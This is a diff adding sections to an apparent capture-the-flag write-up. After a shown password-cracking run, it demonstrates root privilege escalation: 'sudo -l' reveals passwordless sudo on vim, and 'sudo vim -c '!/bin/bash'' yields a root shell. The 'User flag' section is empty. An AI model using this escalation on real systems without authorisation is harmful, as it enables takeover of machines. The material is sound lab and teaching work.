@@ -145,3 +145,23 @@ secret           (?)
 Use the "--show --format=dynamic=md5($s.$p)" options to display all of the cracked passwords reliably
 Session completed.
 ```
+
+# User flag
+
+# Root flag
+We first try to look at sudo rights we can have
+```bash
+mitch@Machine:~$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+So we can execute vim binary as root without any passwd\
+We have our privilege escalation : we can see that vim with sudo right is vulnerable to privesc (https://gtfobins.github.io/gtfobins/vim/#sudo) \
+```bash
+mitch@Machine:~$ sudo /usr/bin/vim -c '!/bin/bash'
+
+root@Machine:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Machine:~#
+```
